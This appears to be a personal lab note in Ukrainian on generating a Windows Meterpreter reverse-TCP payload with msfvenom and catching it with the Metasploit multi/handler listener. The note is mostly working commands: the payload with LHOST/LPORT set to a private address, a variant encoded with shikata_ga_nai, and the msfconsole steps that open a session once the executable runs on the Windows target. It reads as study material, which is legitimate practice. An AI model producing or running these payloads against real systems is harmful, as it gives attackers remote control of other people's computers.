3 Теги : [[створення корисного навантаження (корисної нагрузки) з допомогою Msvenom]]
заходжу в термінал на робочому столі 
ввівши команду :
msfvenom -h
мні стають доступні опції. якщо їх почитати то можна згенерувати корисне навантаження з їх допомогою.
Можна викщристовувати як у наведеному в терміналі прикладі:
Example: /usr/bin/msfvenom -p windows/meterpreter/reverse_tcp LHOST=<IP> -f exe -o payload.exe
 а можна і не вказувати шляху (генерація для 64 бітної машини):
 msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.225 LPORT=5555 -f exe -o shell.exe

_________________________________________
це виправляло жпете:
```bash
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.225 LPORT=5555 -f exe -o shell.exe -e x86/shikata_ga_nai
```_______________________________________________
 де:
 -p   - вказується що це корисне навантаження
  LHOST=192.168.1.225 - локальний хост( ІР компютера з якого проводиться атака)
LPORT=5555 - локальний порт(довільний), до якого буде підключатися ціль
-f  - вказує тип файлу який ми хочемо створити
exe - власне і є тип файлу, який ми створюємо
-o  - вивід (output)
 shell.exe  - імя файлу
**Отже** цим вводом ми генеруємо корисне навантаження: 
msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.225 LPORT=5555 -f exe -o shell.exe

після нажимання ентера файл корисного навантаження появляється на робочому столі калі лінукс.
цей файл доставляю на віндовс.
коли щго виконати н авіндовсі він попробує встановити звязок з ос калі через вказаний поре (5555)

## на машині калі :
запускаю консоль :
msfconsole
і починаю використовувати несправжній експлойт
use exploit/multi/handler
потім потрібно поставити прослуховування:
подивившись параметри :
show options
бачу що потрібно встановити корисну нагрузку - Payload options (generic/shell_reverse_tcp):
вводжу в термінал:
set payload windows/x64/meterpreter/reverse_tcp

знов подивившись параметри :
show options
бачу що треба установити LHOST  i змшнити LPORT, виконавши:
set LHOST 192.168.1.225
set LPORT 5555
далі запускаю прослуховування :
run

**після запуску файлу з корисним навантаженням на віндовс**

то в терміналі калі відкриється сессія звязку з віндовс
